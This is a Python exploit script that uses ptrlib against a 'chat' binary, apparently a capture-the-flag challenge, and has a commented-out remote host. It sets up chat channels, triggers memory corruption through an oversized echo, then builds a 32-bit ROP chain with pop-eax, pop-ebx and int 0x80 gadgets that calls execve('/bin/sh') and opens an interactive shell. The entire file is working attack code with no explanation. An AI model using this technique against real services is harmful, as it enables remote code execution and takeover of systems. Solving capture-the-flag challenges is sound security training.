from ptrlib import *

def nc():
    sock.sendlineafter("> ", "/nc")
    sock.recvuntil("Channel ")
    return int(sock.recvline()[:-1])

def echo(size, data):
    sock.sendlineafter("> ", "/e")
    sock.sendline(str(size))
    sock.sendline(data)
    return

def pc():
    sock.sendlineafter("> ", "/pc")
    return

def qc():
    sock.sendlineafter("> ", "/qc")
    return

def jc(cid):
    sock.sendlineafter("> ", "/jc {}".format(cid))

elf = ELF("./chat")
sock = Socket("localhost", 9999)
#sock = Socket("chat.forfuture.fluxfingers.net", 1337)
rop_pop_eax = 0x08051cf6
rop_pop_ebx = 0x0804901e
rop_int80 = 0x0807d3d0

# channel 1
nc()
pc()
# channel 2
nc()
pc()

# ROP
envp = 0x8048000 + next(elf.find("\0"*4))
payload = b''
payload += flat([
    p32(0xdeadbeef),
    p32(elf.symbol("command") + 0x14),
    p32(elf.symbol("command") + 0x10),
    p32(rop_pop_ebx),
    p32(elf.symbol("command") + 0x8),
    p32(rop_pop_eax),
    p32(11),
    p32(rop_int80)
])
assert b'\n' not in payload
assert b'\r' not in payload

jc(1)
# 0x3d090 - 0xa30
echo(250000, payload)
qc()

payload  = b"/jc 2\0\0\0"
payload += b"/bin/sh\0"
payload += p32(elf.symbol("command") + 8)
payload += p32(0)
sock.sendlineafter("> ", payload)

sock.interactive()
